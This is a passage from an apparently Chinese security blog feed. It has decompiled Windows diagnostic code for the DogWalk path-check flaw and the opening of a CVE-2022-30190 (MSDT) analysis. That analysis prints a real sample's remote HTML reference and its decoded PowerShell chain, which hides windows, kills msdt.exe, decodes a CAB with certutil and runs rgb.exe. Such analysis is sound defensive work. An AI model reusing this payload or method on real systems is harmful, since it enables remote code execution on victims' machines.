punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Check if any file at %TMP\SDIAG_random-clsid is sub-directory of folder %TMP%\SDIAG_random-clsid</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span> dwLastError6 <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">)</span>          <span class="token punctuation">{</span>REPORT_FAILURE<span class="token operator">:</span>            wil<span class="token operator">::</span>details<span class="token operator">::</span>in1diag3<span class="token operator">::</span><span class="token function">_Log_Hr</span><span class="token punctuation">(</span>retaddr<span class="token punctuation">,</span> <span class="token number">0x80D</span><span class="token punctuation">,</span> v21<span class="token punctuation">,</span> dwLastError6<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">continue</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token operator">*</span>Data <span class="token punctuation">)</span>                         <span class="token comment">// Result is stored at "Data": *Data=0x1 =&gt; CopyFile, if not: continue. </span>                                                <span class="token comment">// So this is actually the ##DogWalk vuln check.</span>            <span class="token keyword">continue</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">CopyFileW</span><span class="token punctuation">(</span>sWebDavFile<span class="token punctuation">,</span> sTmpSDiagFile<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token comment">// Vulnerable CopyFile op</span>        <span class="token punctuation">{</span>          dwLastError2 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span>        <span class="token punctuation">{</span>          dwLastError1 <span class="token operator">=</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          dwLastError2 <span class="token operator">=</span> dwLastError1 <span class="token operator">|</span> <span class="token number">0x80070000</span><span class="token punctuation">;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span> dwLastError1 <span class="token operator">&lt;=</span> <span class="token number">0</span> <span class="token punctuation">)</span>            dwLastError2 <span class="token operator">=</span> dwLastError1<span class="token punctuation">;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>dwLastError2 <span class="token operator">&amp;</span> <span class="token number">0x80000000</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span> <span class="token punctuation">)</span>          <span class="token punctuation">{</span>            dwLastError3 <span class="token operator">=</span> dwLastError2<span class="token punctuation">;</span>            itraceCode2 <span class="token operator">=</span> <span class="token number">2151</span>i64<span class="token punctuation">;</span>            <span class="token keyword">goto</span> DEBUG_TRACE5<span class="token punctuation">;</span>          <span class="token punctuation">}</span>        <span class="token punctuation">}</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token function">FindNextFileW</span><span class="token punctuation">(</span>hFind<span class="token punctuation">,</span> <span class="token operator">&amp;</span>FindFileData<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// File Search</span>  <span class="token punctuation">}</span>  operator <span class="token function">delete</span><span class="token punctuation">(</span>sWebDavFile<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> sTmpSDiagFile <span class="token punctuation">)</span>    operator <span class="token function">delete</span><span class="token punctuation">(</span>sTmpSDiagFile<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>hFind <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">0xFFFFFFFFFFFFFFFDu</span>i64 <span class="token punctuation">)</span>    <span class="token function">FindClose</span><span class="token punctuation">(</span>hFind<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> dwLastError2<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>读取TurnoffCheck设置。  检查参数是否有错误。  检查WebDAVROOT中是否存在文件夹或文件\，如果存在则继续。  如果turnoffcheck setup，则copyfile不进行其他检查。  否则，检查是否有任何WebDAV文件是包源的子目录。  然后，检查是否有任何文件是文件夹%tmp%\sdiag_random-clsid的子目录。  如果*data=1，则copyfile，否则文件/文件夹搜索将继续。 </p><h3 id="sdiageng-SdpIsSubDirectory"><a href="#sdiageng-SdpIsSubDirectory" class="headerlink" title="sdiageng!SdpIsSubDirectory"></a>sdiageng!SdpIsSubDirectory</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">SdpIsSubDirectory</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">unsigned</span> __int16 <span class="token operator">*</span>aParentDir<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">unsigned</span> __int16 <span class="token operator">*</span>aChildDir<span class="token punctuation">,</span> <span class="token keyword">int</span> <span class="token operator">*</span>aData<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> <span class="token operator">*</span>lData<span class="token punctuation">;</span> <span class="token comment">// r14</span>  <span class="token keyword">const</span> <span class="token keyword">unsigned</span> __int16 <span class="token operator">*</span>lChildDir<span class="token punctuation">;</span> <span class="token comment">// r12</span>  <span class="token class-name">wchar_t</span> <span class="token operator">*</span>sChildDir3<span class="token punctuation">;</span> <span class="token comment">// rdi</span>  <span class="token class-name">size_t</span> iLenParentDir<span class="token punctuation">;</span> <span class="token comment">// rsi</span>  <span class="token keyword">unsigned</span> __int64 iLenChildDir<span class="token punctuation">;</span> <span class="token comment">// rbp</span>  __int64 itraceCode1<span class="token punctuation">;</span> <span class="token comment">// r8</span>  <span class="token keyword">signed</span> <span class="token keyword">int</span> dwLastError1<span class="token punctuation">;</span> <span class="token comment">// ebx</span>  <span class="token keyword">signed</span> <span class="token keyword">int</span> dwLastError4<span class="token punctuation">;</span> <span class="token comment">// eax</span>  <span class="token class-name">wchar_t</span> <span class="token operator">*</span>sParentDir2<span class="token punctuation">;</span> <span class="token comment">// r15</span>  <span class="token keyword">int</span> dwLastError3<span class="token punctuation">;</span> <span class="token comment">// er9</span>  __int64 itraceCode3<span class="token punctuation">;</span> <span class="token comment">// r8</span>  <span class="token keyword">signed</span> <span class="token keyword">int</span> dwLastError5<span class="token punctuation">;</span> <span class="token comment">// eax</span>  <span class="token keyword">int</span> dwLastError2<span class="token punctuation">;</span> <span class="token comment">// er9</span>  __int64 itraceCode2<span class="token punctuation">;</span> <span class="token comment">// r8</span>  __int64 iCharCounter1<span class="token punctuation">;</span> <span class="token comment">// rdx</span>  <span class="token class-name">wchar_t</span> <span class="token operator">*</span>sParentDir3<span class="token punctuation">;</span> <span class="token comment">// rax</span>  __int64 iCharCounter2<span class="token punctuation">;</span> <span class="token comment">// rdx</span>  <span class="token class-name">wchar_t</span> <span class="token operator">*</span>sChildDir2<span class="token punctuation">;</span> <span class="token comment">// rax</span>  <span class="token class-name">wchar_t</span> <span class="token operator">*</span>sChildDir1<span class="token punctuation">;</span> <span class="token comment">// [rsp+60h] [rbp+8h]</span>  <span class="token class-name">wchar_t</span> <span class="token operator">*</span>sParentDir1<span class="token punctuation">;</span> <span class="token comment">// [rsp+78h] [rbp+20h]</span>  lData <span class="token operator">=</span> aData<span class="token punctuation">;</span>  sParentDir1 <span class="token operator">=</span> <span class="token number">0</span>i64<span class="token punctuation">;</span>  lChildDir <span class="token operator">=</span> aChildDir<span class="token punctuation">;</span>  sChildDir1 <span class="token operator">=</span> <span class="token number">0</span>i64<span class="token punctuation">;</span>  sChildDir3 <span class="token operator">=</span> <span class="token number">0</span>i64<span class="token punctuation">;</span>  iLenParentDir <span class="token operator">=</span> <span class="token number">0</span>i64<span class="token punctuation">;</span>  iLenChildDir <span class="token operator">=</span> <span class="token number">0</span>i64<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>aParentDir <span class="token punctuation">)</span>                            <span class="token comment">// Check arguments for errors</span>  <span class="token punctuation">{</span>    itraceCode1 <span class="token operator">=</span> <span class="token number">1957</span>i64<span class="token punctuation">;</span>DEBUG_TRACE1<span class="token operator">:</span>    dwLastError1 <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">2147024809</span><span class="token punctuation">;</span>    <span class="token function">SdpDebugTrace</span><span class="token punctuation">(</span><span class="token number">1u</span><span class="token punctuation">,</span> L<span class="token string">"SdpIsSubDirectory"</span><span class="token punctuation">,</span> itraceCode1<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">2147024809</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> dwLastError1<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>aChildDir <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    itraceCode1 <span class="token operator">=</span> <span class="token number">1958</span>i64<span class="token punctuation">;</span>    <span class="token keyword">goto</span> DEBUG_TRACE1<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>aData <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    itraceCode1 <span class="token operator">=</span> <span class="token number">1959</span>i64<span class="token punctuation">;</span>    <span class="token keyword">goto</span> DEBUG_TRACE1<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  dwLastError4 <span class="token operator">=</span> <span class="token function">SdpGetFullPath</span><span class="token punctuation">(</span>aParentDir<span class="token punctuation">,</span> <span class="token operator">&amp;</span>sParentDir1<span class="token punctuation">,</span> <span class="token number">0</span>i64<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Get Full path for parent directory</span>  sParentDir2 <span class="token operator">=</span> sParentDir1<span class="token punctuation">;</span>  dwLastError1 <span class="token operator">=</span> dwLastError4<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> dwLastError4 <span class="token operator">&gt;=</span> <span class="token number">0</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    dwLastError5 <span class="token operator">=</span> <span class="token function">SdpGetFullPath</span><span class="token punctuation">(</span>lChildDir<span class="token punctuation">,</span> <span class="token operator">&amp;</span>sChildDir1<span class="token punctuation">,</span> <span class="token number">0</span>i64<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Get Full path for child directory</span>    dwLastError1 <span class="token operator">=</span> dwLastError5<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> dwLastError5 <span class="token operator">&gt;=</span> <span class="token number">0</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> sParentDir2 <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        iCharCounter1 <span class="token operator">=</span> <span class="token number">260</span>i64<span class="token punctuation">;</span>        sParentDir3 <span class="token operator">=</span> sParentDir2<span class="token punctuation">;</span>        <span class="token keyword">do</span>                                      <span class="token comment">// Calculate length for parent directory</span>        <span class="token punctuation">{</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token operator">*</span>sParentDir3 <span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>          <span class="token operator">++</span>sParentDir3<span class="token punctuation">;</span>          <span class="token operator">--</span>iCharCounter1<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span> iCharCounter1 <span class="token punctuation">)</span><span class="token punctuation">;</span>        dwLastError1 <span class="token operator">=</span> iCharCounter1 <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">?</span> <span class="token number">0x80070057</span> <span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> iCharCounter1 <span class="token punctuation">)</span>          iLenParentDir <span class="token operator">=</span> <span class="token number">260</span> <span class="token operator">-</span> iCharCounter1<span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">else</span>      <span class="token punctuation">{</span>        dwLastError1 <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">2147024809</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> dwLastError1 <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">)</span>        iLenParentDir <span class="token operator">=</span> <span class="token number">0</span>i64<span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> dwLastError1 <span class="token operator">&gt;=</span> <span class="token number">0</span> <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        sChildDir3 <span class="token operator">=</span> sChildDir1<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> sChildDir1 <span class="token punctuation">)</span>        <span class="token punctuation">{</span>          iCharCounter2 <span class="token operator">=</span> <span class="token number">260</span>i64<span class="token punctuation">;</span>          sChildDir2 <span class="token operator">=</span> sChildDir1<span class="token punctuation">;</span>          <span class="token keyword">do</span>                                    <span class="token comment">// Calculate length for child directory</span>          <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token operator">*</span>sChildDir2 <span class="token punctuation">)</span>              <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token operator">++</span>sChildDir2<span class="token punctuation">;</span>            <span class="token operator">--</span>iCharCounter2<span class="token punctuation">;</span>          <span class="token punctuation">}</span>          <span class="token keyword">while</span> <span class="token punctuation">(</span> iCharCounter2 <span class="token punctuation">)</span><span class="token punctuation">;</span>          dwLastError1 <span class="token operator">=</span> iCharCounter2 <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">?</span> <span class="token number">0x80070057</span> <span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span> iCharCounter2 <span class="token punctuation">)</span>            iLenChildDir <span class="token operator">=</span> <span class="token number">260</span> <span class="token operator">-</span> iCharCounter2<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span>        <span class="token punctuation">{</span>          dwLastError1 <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">2147024809</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> dwLastError1 <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">)</span>          iLenChildDir <span class="token operator">=</span> <span class="token number">0</span>i64<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> dwLastError1 <span class="token operator">&gt;=</span> <span class="token number">0</span> <span class="token punctuation">)</span>        <span class="token punctuation">{</span>                                       <span class="token comment">// 1) Len for child dir &gt; Len for parent dir</span>                                                <span class="token comment">// 2) _wcsnicmp: Child dir begins with parent dir. Parent dir: %tmp%\SDIAG_random-clsid</span>                                                <span class="token comment">// 3) Last char of parent dir is "\" or next char for child dir, </span>                                                <span class="token comment">// further than parent dir length, is "\" and exist further chars after this.</span>          <span class="token operator">*</span>lData <span class="token operator">=</span> iLenChildDir <span class="token operator">&gt;</span> iLenParentDir                <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">_wcsnicmp</span><span class="token punctuation">(</span>sParentDir2<span class="token punctuation">,</span> sChildDir1<span class="token punctuation">,</span> iLenParentDir<span class="token punctuation">)</span>                <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>sParentDir2<span class="token punctuation">[</span>iLenParentDir <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token char">'\\'</span>                 <span class="token operator">||</span> sChildDir3<span class="token punctuation">[</span>iLenParentDir<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token char">'\\'</span> <span class="token operator">&amp;&amp;</span> sChildDir3<span class="token punctuation">[</span>iLenParentDir <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">goto</span> CLEANUP<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        dwLastError3 <span class="token operator">=</span> dwLastError1<span class="token punctuation">;</span>        itraceCode3 <span class="token operator">=</span> <span class="token number">1971</span>i64<span class="token punctuation">;</span>        <span class="token keyword">goto</span> DEBUG_TRACE2<span class="token punctuation">;</span>      <span class="token punctuation">}</span>      dwLastError2 <span class="token operator">=</span> dwLastError1<span class="token punctuation">;</span>      itraceCode2 <span class="token operator">=</span> <span class="token number">1968</span>i64<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>      dwLastError2 <span class="token operator">=</span> dwLastError5<span class="token punctuation">;</span>      itraceCode2 <span class="token operator">=</span> <span class="token number">1965</span>i64<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">SdpDebugTrace</span><span class="token punctuation">(</span><span class="token number">1u</span><span class="token punctuation">,</span> L<span class="token string">"SdpIsSubDirectory"</span><span class="token punctuation">,</span> itraceCode2<span class="token punctuation">,</span> dwLastError2<span class="token punctuation">)</span><span class="token punctuation">;</span>    sChildDir3 <span class="token operator">=</span> sChildDir1<span class="token punctuation">;</span>    <span class="token keyword">goto</span> CLEANUP<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  dwLastError3 <span class="token operator">=</span> dwLastError4<span class="token punctuation">;</span>  itraceCode3 <span class="token operator">=</span> <span class="token number">1962</span>i64<span class="token punctuation">;</span>DEBUG_TRACE2<span class="token operator">:</span>  <span class="token function">SdpDebugTrace</span><span class="token punctuation">(</span><span class="token number">1u</span><span class="token punctuation">,</span> L<span class="token string">"SdpIsSubDirectory"</span><span class="token punctuation">,</span> itraceCode3<span class="token punctuation">,</span> dwLastError3<span class="token punctuation">)</span><span class="token punctuation">;</span>CLEANUP<span class="token operator">:</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> sParentDir2 <span class="token punctuation">)</span>    operator <span class="token function">delete</span><span class="token punctuation">(</span>sParentDir2<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> sChildDir3 <span class="token punctuation">)</span>    operator <span class="token function">delete</span><span class="token punctuation">(</span>sChildDir3<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> dwLastError1<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>检查参数是否有错误。 获取父目录的完整路径。 获取子目录的完整路径。 计算父目录的字符串长度。 计算子目录的字符串长度。 检查子目录是否真的是父目录的子目录。</p><h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><ul><li><a href="https://irsl.medium.com/the-trouble-with-microsofts-troubleshooters-6e32fc80b8bd">https://irsl.medium.com/the-trouble-with-microsofts-troubleshooters-6e32fc80b8bd</a></li><li><a href="https://docs.microsoft.com/zh-cn/archive/blogs/mattbie/windows-troubleshooting-platform-meta-pack-example">https://docs.microsoft.com/zh-cn/archive/blogs/mattbie/windows-troubleshooting-platform-meta-pack-example</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 漏洞分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2022-30190 MSDT远程代码注入漏洞分析</title>
      <link href="/2023/04/16/CVE-2022-30190%20MSDT%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
      <url>/2023/04/16/CVE-2022-30190%20MSDT%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h2 id="相关知识"><a href="#相关知识" class="headerlink" title="相关知识"></a>相关知识</h2><h4 id="WTP框架"><a href="#WTP框架" class="headerlink" title="WTP框架"></a>WTP框架</h4><p>windows疑难解答平台（WTP）为ISV、OEM和管理员提供了疑难解答包的过程，这些包用于发现和解决计算机上的问题。WTP框架提供自动化检测修复方式。</p><h4 id="底层结构"><a href="#底层结构" class="headerlink" title="底层结构"></a>底层结构</h4><p><img src="/2023/04/16/CVE-2022-30190%20MSDT%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220816150216855.png"></p><ul><li>WTP由两个进程组成，Process1是带UI的Troubleshooting Run-time Engine，Process2用于提供window PowerShell Runtime环境。</li><li>Process2提供的PowerShell运行时环境提供了4条特殊的PowerShell命令：Get-DiagInput、Update-DiagReport、Update-DiagRootCause、Write-DiagProgress</li><li>Troubleshooting Pack运行在Process1和Process2所构建的平台上。</li></ul><h4 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h4><ul><li><p>故障排除包是用户可编程部分，本质上是一组针对特定故障的检测修复脚本。Process1(Troubleshooting Run-time Engine)通过故障排除包获取检测脚本检测问题，查出问题交给Process2(PowerShell)运行处理。</p></li><li><p>Process1是msdt.exe，Process2是sdiagnhost.exe</p></li><li><p>sdiagnhost.exe为了给msdt.exe提供运行脚本的能力，注册了IScriptedDiagnosticHost com接口，相应的com方法是RunScript()</p></li><li><p>故障排除包的设计基于三个步骤：检测问题（troubleshooting）、解决问题（resolution）和验证解决方案（verificationg），对应TS、RS、VF三种脚本。</p></li></ul><h4 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h4><p>WTP提供了一系列默认故障排除包，可以在ms-msdt协议里通过-id参数指定。</p><p>CVE-2022-30190使用PCWDiagnostic，用于程序兼容性故障排除。</p><h2 id="0x00-漏洞描述"><a href="#0x00-漏洞描述" class="headerlink" title="0x00 漏洞描述"></a>0x00 漏洞描述</h2><p>Microsoft Office MSDT存在远程代码执行漏洞，攻击者可以利用Office文件中的远程模块功能，访问远程服务器上挂载的恶意HTML文件，之后通过ms-msdt URL来执行恶意powershell代码，漏洞在宏被禁用的情况下依然可以利用。</p><h2 id="0x01-漏洞分析"><a href="#0x01-漏洞分析" class="headerlink" title="0x01 漏洞分析"></a>0x01 漏洞分析</h2><p>CVE-2022-30190本质上是PowerShell代码注入漏洞。MSDT和Powershell的C:\Windows\diagnostics\system\PCW\TS_ProgramCompatibilityWizard.ps1脚本交互，相关的IT_BrowseForFile参数存在命令注入，最终的调用PowerShell动态执行。</p><p><strong>影响版本：</strong></p><pre class="line-numbers language-none"><code class="language-none">Microsoft Windows Server 2008 SP2Microsoft Windows 11Microsoft Windows Server 2019Microsoft Windows 10 1607Microsoft Windows Server 20H2Microsoft Windows Server 2022Microsoft Windows Server 2016 (Server Core installation)Microsoft Windows Server 2016 nullMicrosoft Windows 10Microsoft Windows 10 1809Microsoft Windows Server 2008 R2 SP1Microsoft Windows Server 2022 (Server Core installation)Microsoft Windows Server 2019 (Server Core installation)Microsoft Windows 8.1Microsoft Windows 10 20H2Microsoft Windows 10 21H2Microsoft Windows Server 2012 R2Microsoft Windows 7 SP1Microsoft Windows RT 8.1 SP0Microsoft Windows Server 2012Microsoft Windows 10 21H1Microsoft Windows Server 2022 Azure Edition Core Hotpatch <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="样本分析"><a href="#样本分析" class="headerlink" title="样本分析"></a>样本分析</h4><p>样本是docx文件，解压，其中/word/_rels目录下的document.xml.rels文件包含对<a href="https://www.xmlformats.com/office/word/2022/wordprocessingDrawing/RDF842l.html%E7%9A%84%E5%A4%96%E9%83%A8%E5%BC%95%E7%94%A8%E3%80%82">https://www.xmlformats.com/office/word/2022/wordprocessingDrawing/RDF842l.html的外部引用。</a></p><p><img src="/2023/04/16/CVE-2022-30190%20MSDT%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220816163900629.png"></p><p><strong>RDF842l.html原始内容：</strong></p><p>使用了4个参数，IT_RebrowseForFile、IT_LaunchMethod、IT_SelectProgram、IT_BrowseForFile。利用IT_BrowseForFile参数加载了powershell脚本执行恶意功能。4096字节的A填充，是windows诊断工具的缓冲区大小。</p><pre class="line-numbers language-none"><code class="language-none">&lt;!doctype html&gt;&lt;html lang="en"&gt;&lt;body&gt;&lt;script&gt;                         &lt;/script&gt;&lt;/body&gt;&lt;/html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>首先使用window.location.href创建窗口，ms-msdt是windows诊断工具，之后调用powershell，执行的内容经过了base64加密</p><p><img src="/2023/04/16/CVE-2022-30190%20MSDT%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220817165023922.png"></p><p>解密得到</p><pre class="line-numbers language-none"><code class="language-none">$cmd = "c:\windows\system32\cmd.exe";Start-Process $cmd -windowstyle hidden -ArgumentList "/c taskkill /f /im msdt.exe";Start-Process $cmd -windowstyle hidden -ArgumentList "/c cd C:\users\public\&amp;&amp;for /r %temp% %i in (05-2022-0438.rar) do copy %i 1.rar /y&amp;&amp;findstr TVNDRgAAAA 1.rar&gt;1.t&amp;&amp;certutil -decode 1.t 1.c &amp;&amp;expand 1.c -F:* .&amp;&amp;rgb.exe";<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>启动隐藏窗口：</p><pre class="line-numbers language-none"><code class="language-none">如果msdt.exe正在运行，终止它循环遍历RAR文件中的文件，查找编码CAB文件的Base64字符串将Base64字符串编码的cab文件保存1.c将1.c cab文件展开到当前目录最后执行rgb.exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>因此window会无限制执行powershell.如果修改成想要执行的代码，就会导致远程代码执行漏洞。因此，只需修改xml文件，引用网站上的恶意代码就行。</p><h4 id="触发条件"><a href="#触发条件" class="headerlink" title="触发条件"></a>触发条件</h4><p>在Microsoft.Windows.Diagnosis.SDHost.dll里的Microsoft.Windows.Diagnosis.ManagedHost.Run Script()方法实现了IScriptedDiagnosticHost com接口里的RunScript方法，用于给msdt.exe提供执行检测脚本所需要的PowerShell运行时环境，然后重新触发漏洞。RunScript()方法一共被触发了两次，第一次用于调用TS脚本，第二次用于调用RS脚本。</p><p>要触发对RS_ProgramCompatibityWizard.ps1的调用，要先通过TS_ProgramCompatibilityWizard.ps1脚本的检测</p><h4 